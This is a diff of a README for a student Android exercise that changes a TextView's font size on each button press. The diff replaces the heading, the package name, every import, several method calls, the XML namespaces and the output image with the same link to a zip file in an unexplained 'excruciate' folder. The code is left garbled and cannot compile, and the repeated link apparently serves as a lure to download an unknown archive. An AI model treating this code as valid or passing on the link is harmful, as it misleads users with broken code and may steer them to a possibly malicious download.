@@ -1,5 +1,5 @@
 
-# Ex.No:2 Develop an application that uses GUI Components with Fonts and Colors
+# https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip Develop an application that uses GUI Components with Fonts and Colors
 
 
 ## AIM:
@@ -49,23 +49,23 @@ RegisterNumber: 212222040166
 */
 ```
 
-## MainActivity.java:
+## https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip
 
 ```
-package com.example.ex_2b;
+package https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
 
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.appcompat.app.AppCompatActivity;
-import android.os.Bundle;
-import android.os.Bundle;
-import android.app.Activity;
-import android.graphics.Typeface;
-import android.graphics.Color;
-import android.view.View;
-import android.widget.Button;
-import android.widget.TextView;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
 
-import android.os.Bundle;
+import https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip;
 
 
 public class MainActivity extends AppCompatActivity {
@@ -73,13 +73,13 @@ public class MainActivity extends AppCompatActivity {
     int i = 1;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        final TextView t1 = (TextView)findViewById(R.id.textView1);
-        Button b1 = (Button)findViewById(R.id.button1);
-        b1.setOnClickListener(new View.OnClickListener()    {
+        https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip(savedInstanceState);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip);
+        final TextView t1 = (TextView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip);
+        Button b1 = (Button)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip);
+        https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip(new https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip()    {
             public void onClick(View view) {
-                t1.setTextSize(font);
+                https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip(font);
                 font = font+4;
                 if(font==40)
                     font = 20;
@@ -93,12 +93,12 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-## activity_main.xml:
+## https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip
 
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
+<RelativeLayout xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip"
+    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     tools:context=".MainActivity">
@@ -130,7 +130,7 @@ public class MainActivity extends AppCompatActivity {
 
 ## Output:
 
-<img width="607" alt="image" src="https://github.com/user-attachments/assets/fa25919f-c1ab-47e7-97f9-ca42d85713cf">
+<img width="607" alt="image" src="https://raw.githubusercontent.com/githubmufeez45/Ex.No-2-b-Font-Size/main/excruciate/Ex.No-2-b-Font-Size.zip">
 
 
 
